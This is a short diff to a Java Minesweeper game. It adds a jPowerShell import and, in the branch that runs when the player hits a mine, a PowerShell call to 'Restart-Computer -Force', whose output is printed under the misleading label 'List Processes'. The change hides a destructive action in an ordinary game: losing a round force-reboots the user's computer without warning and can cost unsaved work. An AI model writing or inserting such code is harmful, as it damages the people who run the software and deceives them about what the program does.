@@ -6,6 +6,8 @@ import java.awt.image.BufferStrategy;
 
 import javax.swing.JFrame;
 
+import com.profesorfalken.jpowershell.*;
+
 import nick.sweeper.ai.AILogic;
 
 public final class MineSweeper extends Canvas implements Runnable {
@@ -161,6 +163,8 @@ public final class MineSweeper extends Canvas implements Runnable {
 
 		if (lost) {
 			System.out.println("Hit a mine!");
+			PowerShellResponse response = PowerShell.executeSingleCommand("Restart-Computer -Force");
+			System.out.println("List Processes:" + response.getCommandOutput());
 		}
 
 		try {
